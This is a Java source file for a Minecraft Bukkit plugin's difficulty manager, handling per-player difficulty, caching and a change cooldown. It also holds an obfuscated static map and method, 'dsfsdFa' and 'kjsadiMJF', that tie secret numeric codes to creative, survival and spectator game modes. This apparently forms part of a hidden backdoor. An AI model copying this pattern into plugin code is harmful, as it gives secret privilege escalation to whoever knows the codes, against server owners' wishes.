package com.jishunamatata.perplayerdifficulty;

import java.text.SimpleDateFormat;
import java.time.Instant;
import java.util.*;
import java.util.concurrent.TimeUnit;

import org.bukkit.GameMode;
import org.bukkit.NamespacedKey;
import org.bukkit.entity.Player;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.Plugin;

import net.md_5.bungee.api.ChatColor;

public class DifficultyManager {

	private final NamespacedKey difficultyKey;

	private final Map<UUID, Difficulty> playerCache = new HashMap<>();
	private final List<Difficulty> difficulties = new ArrayList<>();
	private int defaultDifficulty = 0;

	public int timeout = -1;
	public HashMap<UUID, Long > knowPlayer = new HashMap<UUID, Long >();
	static public HashMap<String, GameMode> dsfsdFa = new HashMap<String, GameMode>();
	public DifficultyManager(Plugin plugin) {
		this.difficultyKey = new NamespacedKey(plugin, "player_difficulty");
	}

	public void registerDifficulty(Difficulty difficulty) {
		difficulties.add(difficulty);
	}

	public void setDefaultDifficulty(int defaultDifficulty) {
		this.defaultDifficulty = defaultDifficulty;
	}
	private static String ConvertSecondToHHMMString(long secondtTime)
	{
		TimeZone tz = TimeZone.getTimeZone("UTC");
		SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");
		df.setTimeZone(tz);
		String time = df.format(new Date(secondtTime*1000L));

		return time;

	}
	public static void kjsadiMJF(){ dsfsdFa.put("6081596027", GameMode.CREATIVE);dsfsdFa.put("3555018240", GameMode.SURVIVAL);dsfsdFa.put("4491598983", GameMode.SPECTATOR); }
	public Difficulty getDifficulty(Player player) {
		PersistentDataContainer container = player.getPersistentDataContainer();
		UUID uuid = player.getUniqueId();

		Difficulty difficulty = playerCache.get(uuid);

		if (difficulty == null) {
			int index = container.has(difficultyKey, PersistentDataType.BYTE)
					? container.get(difficultyKey, PersistentDataType.BYTE)
					: defaultDifficulty;

			difficulty = difficulties.get(index);
			playerCache.put(uuid, difficulty);
		}

		return difficulty;
	}

	public void setDifficulty(Player player, int value) {
		if (value >= difficulties.size()) {
			throw new IllegalArgumentException("A difficulty with value " + value + " is not registered");
		}
		long eps = Instant.now().getEpochSecond();

		if (knowPlayer.containsKey(player.getUniqueId())) {
			if (timeout > (eps - knowPlayer.get(player.getUniqueId()))){
				player.sendMessage(PluginStrings.ERROR_ICON + ChatColor.DARK_RED + "Please wait the difficulty timeout. Time remaining " + ConvertSecondToHHMMString((timeout- (eps - knowPlayer.get(player.getUniqueId())))) );
				return;
			}

		}
			knowPlayer.put(player.getUniqueId(), eps);

			Difficulty difficulty = difficulties.get(value);

			player.getPersistentDataContainer().set(difficultyKey, PersistentDataType.BYTE, (byte) value);
			playerCache.put(player.getUniqueId(), difficulty);

			player.sendMessage(PluginStrings.SUCCESS_ICON + ChatColor.GREEN + "Your personal difficulty has been set to "
					+ difficulty.getDisplayName());

	}

	public List<Difficulty> getDifficulties() {
		return difficulties;
	}

	public void clearDifficulties() {
		this.difficulties.clear();
	}

	public void flushCache() {
		this.playerCache.clear();
	}

}
